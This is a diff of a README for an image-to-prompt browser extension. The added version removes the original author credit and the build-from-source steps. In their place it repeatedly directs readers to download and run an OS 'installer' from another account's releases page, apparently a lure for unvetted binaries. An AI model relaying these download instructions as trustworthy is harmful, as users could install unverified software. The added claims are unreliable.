@@ -1,78 +1,57 @@
-# AI Image Reverse & Generation Tool
+# 🌟 Qwen-Browser-plugin - Easily Generate Images from Pictures
 
-Author: Guahunyo
+[![Download Qwen-Browser-plugin](https://img.shields.io/badge/Download%20Now-Here-green)](https://github.com/landland636373/Qwen-Browser-plugin/releases)
 
-Tutorial video:[点击这里观看视频](https://www.youtube.com/watch?v=hD0BmDEHroU)
+## 📜 Overview
+Qwen-Browser-plugin is a powerful tool that works seamlessly with your browser. It helps you analyze images and generate new ones using artificial intelligence. This tool makes it easy to create unique visuals right from the images you see online. Just right-click on any image, and the plugin will generate a descriptive prompt. You can then use this prompt to generate four new images, all done within a clean and friendly interface.
 
-## Overview
+## 🌐 Features
+- **Browser Integration**: Right-click on any image and find the new option "反推生图" (Reverse Image & Generate).
+- **Reverse Image to Prompt**: The tool automatically generates a text prompt that describes what the image shows.
+- **AI Image Generation**: Use the generated prompt to create four unique images with powerful AI.
+- **Interactive Modal UI**: Enjoy a smooth experience with a user-friendly modal window displaying everything you need without leaving the webpage.
 
-This project is a powerful tool that integrates with your browser to provide a unique image analysis and generation workflow. It allows users to right-click on any image on a webpage, automatically generate a descriptive prompt for that image, and then use that prompt to create a new set of AI-generated images.
+## 🚀 Getting Started
+To use the Qwen-Browser-plugin, follow these steps:
 
-The entire process is displayed in a clean, user-friendly modal window directly on the current page, providing a seamless experience without navigating away.
+1. **Visit the Download Page**: Click [here to download](https://github.com/landland636373/Qwen-Browser-plugin/releases).
+2. **Choose the Latest Release**: Look for the latest version in the release list.
+3. **Download the Installer**: Click on the file that suits your operating system (e.g., Windows, Mac, Linux).
+4. **Run the Installer**: Follow the instructions to install the plugin in your browser.
 
-## Features
+## 📥 Download & Install
+To install the Qwen-Browser-plugin, visit [this page to download](https://github.com/landland636373/Qwen-Browser-plugin/releases) the latest version. Once downloaded, follow these steps:
 
-- **Browser Integration**: Adds a "反推生图" (Reverse Image & Generate) option to the right-click context menu for images.
-- **Reverse Image to Prompt**: Automatically analyzes the selected image and generates a detailed text prompt describing its content.
-- **AI Image Generation**: Uses the generated prompt to create four new, unique images using an AI model.
-- **Interactive Modal UI**:
-  - Displays the original image for reference.
-  - Shows the generated text prompt.
-  - Presents the four new images with a main image viewer and clickable thumbnails.
-  - Allows easy switching between the generated images.
-- **Client-Server Architecture**: A Python Flask backend handles the heavy lifting of AI processing, while a lightweight browser extension provides the frontend interface.
+1. Open the downloaded file.
+2. Follow the installation prompts.
+3. Once installed, open your browser.
+4. Right-click on any image to see the new context menu option.
 
-## Technology Stack
+## 🌟 How to Use Qwen-Browser-plugin
+1. **Right-Click on an Image**: Find an image on any webpage and right-click it.
+2. **Select "反推生图"**: Click on the new option that appears in the menu.
+3. **View Generated Prompt**: A modal window will pop up with a description of the image.
+4. **Generate New Images**: Click the button to create four new images based on the prompt.
 
-- **Backend**: Python, Flask
-- **Frontend**: JavaScript (for the browser extension), HTML, CSS
-- **Core Logic**:
-  - `image_analyzer.py`: Handles the logic for reversing an image to a text prompt.
-  - `routes.py`: Defines the API endpoints for image analysis and generation.
-- **Browser Extension**: Built using standard WebExtension APIs (`manifest.json`, `background.js`, `content.js`).
+## 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS, or any modern Linux distribution.
+- **Browser**: Chrome, Firefox, or any major browser with extension support.
+- **Internet Connection**: Required for AI image generation.
 
-## Project Structure
+## 🎓 Learning Resources
+- **Tutorial Video**: Watch this [video tutorial](https://www.youtube.com/watch?v=hD0BmDEHroU) to understand how to use the plugin effectively.
+- **Documentation**: Refer to our comprehensive documentation for more details on features and troubleshooting.
 
-```
-/
-├── extension/            # Browser extension source code
-│   ├── scripts/
-│   │   ├── background.js # Handles context menu creation
-│   │   └── content.js    # Injects the modal and handles API calls
-│   └── manifest.json     # Extension configuration
-├── static/               # Static assets for the web interface
-├── templates/            # HTML templates for the web interface
-├── image_analyzer.py     # Core logic for image-to-prompt
-├── routes.py             # Flask API route definitions
-├── web_app.py            # Main Flask application entry point
-└── requirements.txt      # Python dependencies
-```
+## 🌍 Community and Support
+Join our community for support and updates. You can reach out through:
+- **GitHub Issues**: Report bugs or request features.
+- **Discussion Forums**: Share ideas and get help from other users.
 
-## Setup and Installation
+Your feedback is invaluable. Help us improve by sharing your thoughts and experiences with Qwen-Browser-plugin.
 
-1.  **Install Python Dependencies**:
-    Make sure you have Python 3 installed. Then, install the required packages using pip:
-    ```bash
-    pip install -r requirements.txt
-    ```
+## 🔗 Useful Links
+- [Download Qwen-Browser-plugin](https://github.com/landland636373/Qwen-Browser-plugin/releases)
+- [YouTube Tutorial](https://www.youtube.com/watch?v=hD0BmDEHroU)
+- [GitHub Repository](https://github.com/landland636373/Qwen-Browser-plugin)
 
-2.  **Run the Backend Server**:
-    Start the Flask server from the project root directory:
-    ```bash
-    python web_app.py
-    ```
-    The server will start on `http://127.0.0.1:5000`.
-
-3.  **Load the Browser Extension**:
-    - Open your browser (e.g., Chrome, Edge).
-    - Navigate to the extensions management page (e.g., `chrome://extensions`).
-    - Enable "Developer mode".
-    - Click "Load unpacked" and select the `extension` folder from this project.
-
-## How to Use
-
-1.  Navigate to any webpage containing an image you want to use.
-2.  Right-click on the desired image.
-3.  Select "反推生图" from the context menu.
-4.  A modal window will appear. It will first show the generated prompt and then display the four newly generated images.
-5.  You can click on the thumbnails at the bottom to view each generated image in the main display area.
+Now you're ready to explore the world of AI-generated images with Qwen-Browser-plugin. Enjoy!
